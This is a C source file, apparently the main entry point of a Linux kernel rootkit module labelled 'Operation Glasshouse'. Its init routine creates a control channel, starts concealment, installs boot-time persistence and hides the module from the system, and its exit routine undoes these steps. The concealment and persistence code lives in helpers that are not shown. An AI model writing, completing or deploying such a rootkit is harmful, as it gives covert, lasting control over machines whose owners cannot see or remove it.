// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/module.h>

static int __init rootkit_init(void)
{
	int error;

	error = control_create();
	if (error)
		return error;
	error = conceal_start();
	if (error)
		goto destroy_control;
	error = persistence_install();
	if (error)
		goto stop_concealment;
	conceal_module();
	return 0;

stop_concealment:
	conceal_stop();
destroy_control:
	control_destroy();
	return error;
}

static void __exit rootkit_exit(void)
{
	reveal_module();
	if (persistence_remove())
		pr_warn("glasshouse: boot request cleanup failed\n");
	conceal_stop();
	control_destroy();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Operation Glasshouse");
